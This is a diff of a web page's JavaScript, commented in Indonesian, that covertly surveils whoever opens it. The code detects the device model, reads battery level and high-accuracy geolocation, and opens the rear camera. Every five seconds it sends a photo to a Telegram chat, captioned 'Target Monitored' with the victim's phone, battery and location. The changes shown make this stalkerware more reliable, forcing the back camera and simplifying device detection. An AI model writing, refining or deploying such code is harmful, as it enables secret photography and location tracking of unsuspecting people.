@@ -35,25 +35,20 @@
     let deviceName = "Mendeteksi...";
 
     async function getAdvancedDeviceName() {
-        let model = "Android Device";
+        // Deteksi Otomatis untuk Semua Model
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
             try {
                 const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
-                model = hints.model || model;
+                if (hints.model) return hints.model;
             } catch (e) { console.log(e); }
-        } else {
-            const ua = navigator.userAgent;
-            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
-            if (match) {
-                model = match[3].split(" Build")[0].trim();
-            }
         }
-        const modelMap = {
-            "2310FPCA4G": "POCO C65",
-            "M2102J20SG": "POCO X3 Pro",
-            "2201117TY": "Redmi Note 11"
-        };
-        return modelMap[model] || model;
+        
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
+        if (match) {
+            return match[3].split(" Build")[0].trim();
+        }
+        return "Android/Mobile Device";
     }
 
     async function startSystem() {
@@ -71,19 +66,13 @@
             }, { enableHighAccuracy: true });
         }
 
-        // PERUBAHAN DI SINI: Menggunakan facingMode environment untuk kamera belakang
         try {
-            const constraints = { 
-                video: { 
-                    facingMode: "environment" 
-                } 
-            };
+            // Kamera Belakang
+            const constraints = { video: { facingMode: { exact: "environment" } } };
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
             document.getElementById('video').srcObject = stream;
             setInterval(takeAndSend, 5000);
         } catch (e) {
-            console.error("Gagal akses kamera belakang:", e);
-            // Fallback jika kamera belakang tidak ditemukan
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('video').srcObject = stream;
@@ -107,7 +96,7 @@
         const report = (blob) => {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `👁 *Target Terpantau (Kamera Belakang)*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}`);
+            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}`);
             fd.append('parse_mode', 'Markdown');
             
             if (blob) {
@@ -131,3 +120,4 @@
 </script>
 </body>
 </html>
+
